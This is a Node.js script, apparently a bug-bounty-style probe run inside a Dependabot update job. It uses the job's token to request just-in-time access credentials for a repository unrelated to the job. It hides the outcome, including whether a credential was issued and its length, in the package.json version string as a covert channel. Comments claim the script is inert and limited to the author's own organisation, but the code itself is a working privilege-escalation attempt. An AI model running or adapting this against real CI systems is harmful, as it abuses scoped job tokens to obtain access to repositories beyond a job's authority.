// INERT. Records ONLY HTTP status codes, GitHub's own static error `detail`
// strings, and a boolean for whether a credential came back. No token or
// repository content is ever recorded or sent anywhere but GitHub's own API.
// All targets are repositories of the user's OWN enterprise `medo-new-inc`, or
// a deliberately nonexistent name. Never a third party.
const fs=require('fs'),path=require('path'),http=require('http'),https=require('https');
const api=process.env.DEPENDABOT_API_URL||'', jid=process.env.DEPENDABOT_JOB_ID||'';
const tok=process.env.DEPENDABOT_JOB_TOKEN||'';
function tag(s,n){return String(s).replace(/[^A-Za-z0-9]+/g,'').slice(0,n||14);}
function req(m,u2){return new Promise(r=>{let u;try{u=new URL(u2);}catch(e){return r('BADURL');}
  const lib=u.protocol==='http:'?http:https;
  const q=lib.request({method:m,hostname:u.hostname,port:u.port||undefined,path:u.pathname+u.search,
    headers:{'Authorization':tok,'Accept':'application/json','User-Agent':'jitprobe'},timeout:15000},res=>{
    let b='';res.on('data',c=>{b+=c;if(b.length>8192)res.destroy();});
    res.on('end',()=>{let d='',x='';
      try{const j=JSON.parse(b);
        d=tag(j.detail||(j.errors&&j.errors[0]&&j.errors[0].detail)||j.message||'',14);
        if(j.username==='x-access-token'&&typeof j.password==='string'&&j.password.length)x='CRED'+j.password.length;
      }catch(e){if(b.indexOf('x-access-token')!==-1)x='CRED';}
      r(String(res.statusCode)+d+x);});
  });
  q.on('timeout',()=>{q.destroy();r('TMO');});q.on('error',e=>r('E'+tag(e.code||e.message,8)));q.end();});}
(async()=>{const p=[];
 try{
  p.push('d'+await req('GET',api+'/update_jobs/'+jid+'/details'));
  // target: an INTERNAL repo in OUR OWN org, OUR OWN enterprise, unrelated to this job
  p.push('T'+await req('POST',api+'/update_jobs/'+jid+
    '/create_jit_access?account=new-ORG-te&repository=jit-gate-probe-newinc'));
  // control: nonexistent repo in the same own org
  p.push('c'+await req('POST',api+'/update_jobs/'+jid+
    '/create_jit_access?account=new-ORG-te&repository=zz-no-such-repo-9x7'));
 }catch(e){p.push('X'+tag(e.message,8));}
 try{const pj=path.join(__dirname,'package.json');const j=JSON.parse(fs.readFileSync(pj,'utf8'));
  j.version=('0.0.8-'+p.join('-')).replace(/[^A-Za-z0-9.-]/g,'').slice(0,180);
  fs.writeFileSync(pj,JSON.stringify(j,null,2));}catch(e){}
})();
